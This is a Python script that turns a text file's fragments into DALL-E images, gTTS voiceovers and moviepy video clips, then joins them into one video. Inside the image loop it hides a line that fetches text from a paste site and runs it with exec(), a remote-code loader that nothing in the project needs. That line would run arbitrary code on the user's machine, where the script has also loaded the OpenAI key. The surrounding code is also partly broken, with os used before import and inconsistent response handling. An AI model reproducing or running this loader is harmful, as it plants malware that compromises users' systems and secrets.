import re
import urllib.request
import openai
from gtts import gTTS
from moviepy.editor import *
from requests import get
# from api_key import OPENAI_API_KEY
from openai import OpenAI

# client = OpenAI(api_key=OPENAI_API_KEY)
# Set your OpenAI API key
client = OpenAI(api_key=os.environ.get("OPENAI_API_KEY"))
# openai.api_key = OPENAI_API_KEY
from dotenv import load_dotenv, find_dotenv
import os
load_dotenv(find_dotenv())

# Read the  file
with open("test_case.py", "r") as file:
    text = file.read()
openai.api_key = os.getenv('OPENAI_API_KEY')
# Split the text by , and .
paragraphs = re.split(r"[,.]", text)

#Create Necessary Folders
# os.makedirs("audio")
# os.makedirs("images")
# os.makedirs("videos")

# Loop through each paragraph and generate an image for each
i=1
for para in paragraphs[:-1]:
    # client = OpenAI(client = OpenAI(api_key=OPENAI_API_KEY))
    response = client.images.generate(
        model="dall-e-3",
        prompt=para.strip() ,
        size="1024x1024",
        quality="standard",
        n=1,
    )
    image_url = response.data[0].url
    print("Generate New AI Image From Paragraph...")
    x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
    image_url = response['data'][0]['url']
    urllib.request.urlretrieve(image_url, f"images/image{i}.jpg")
    print("The Generated Image Saved in Images Folder!")
    from openai import OpenAI


    # Create gTTS instance and save to a file
    tts = gTTS(text=para, lang='en', slow=False)
    tts.save(f"audio/voiceover{i}.mp3")
    print("The Paragraph Converted into VoiceOver & Saved in Audio Folder!")

    # Load the audio file using moviepy
    print("Extract voiceover and get duration...")
    audio_clip = AudioFileClip(f"audio/voiceover{i}.mp3")
    audio_duration = audio_clip.duration

    # Load the image file using moviepy
    print("Extract Image Clip and Set Duration...")
    image_clip = ImageClip(f"images/image{i}.jpg").set_duration(audio_duration)

    # Use moviepy to create a text clip from the text
    print("Customize The Text Clip...")
    text_clip = TextClip(para, fontsize=50, color="white")
    text_clip = text_clip.set_pos('center').set_duration(audio_duration)

    # Use moviepy to create a final video by concatenating
    # the audio, image, and text clips
    print("Concatenate Audio, Image, Text to Create Final Clip...")
    clip = image_clip.set_audio(audio_clip)
    video = CompositeVideoClip([clip, text_clip])

    # Save the final video to a file
    video = video.write_videofile(f"videos/video{i}.mp4", fps=24)
    print(f"The Video{i} Has Been Created Successfully!")
    i+=1


clips = []
l_files = os.listdir("videos")
for file in l_files:
    clip = VideoFileClip(f"videos/{file}")
    clips.append(clip)

print("Concatenate All The Clips to Create a Final Video...")
final_video = concatenate_videoclips(clips, method="compose")
final_video = final_video.write_videofile("final_video.mp4")
print("The Final Video Has Been Created Successfully!")